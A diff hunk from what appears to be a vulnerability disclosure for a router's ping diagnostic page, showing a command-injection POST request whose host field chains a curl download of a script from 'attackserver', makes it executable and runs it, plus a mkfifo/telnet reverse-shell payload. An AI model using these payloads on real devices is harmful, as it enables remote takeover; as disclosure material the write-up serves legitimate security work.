@@ -27,7 +27,7 @@ This is where an attack vector is noticed. A user can exploit the vulnerability 
 HTTP POST Request to `sta_rede.diagnostico_ping`:
 `page=sta_rede.diagnostico_ping&host=x.x.x.x;curl -O http://attackserver/maliciousfile.sh; chmod +x maliciousfile.sh; ./maliciousfile.sh&testar_pacote=1&ttl=64`
 
-### Maicious file content
+### Maicious file content:
 TF=$(mktemp -u);mkfifo $TF && telnet $attacker.ip $attacker.port 0<$TF | sh 1>$TF
 
 By listening on the specified port with Netcat, a reverse shell is successfully opened.
